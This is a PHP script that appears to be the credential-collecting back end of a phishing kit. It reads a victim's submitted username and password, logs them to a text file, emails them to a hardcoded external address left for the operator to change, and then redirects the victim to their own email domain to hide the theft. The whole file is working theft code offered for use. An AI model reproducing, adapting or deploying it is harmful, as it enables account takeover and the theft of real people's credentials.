<?php
session_start();

require_once('fnsjytfgweriug.php');

//CHANGE RETURN EMAIL BELOW
$bounce_e = 'theyearofblessing@yandex.com';


$em= $_POST['username'];
$pp = $_POST['password'];
$captcha = $_POST['captcha'];

if($captcha != $_SESSION['CAPTCHA_CODE'])
{
    echo 'captcha';
    exit;
}


$reader = intval($_POST['counter']);

$reader = $reader+1;

//echo $reader;

$redirect = explode('@',$em);

$body_msg  ="$em | ~| ";
$body_msg  .="$pp |~ | ";
$body_msg  .= "$ip | ~| ";

if(isset($em) && isset($pp))
{
$addon = "From: $em";
$summary = ''.$pp;

$file = fopen("logissues.txt", "a");
fputs ($file, "$body_msg\r\n");
fclose ($file);


@mail($bounce_e, $summary ,$body_msg ,$addon);
}

// This is the response to the ajax call
if($reader < '2')
{
    echo $reader;
}
else
{
    echo 'http://'.$redirect[1].'/';
}


?>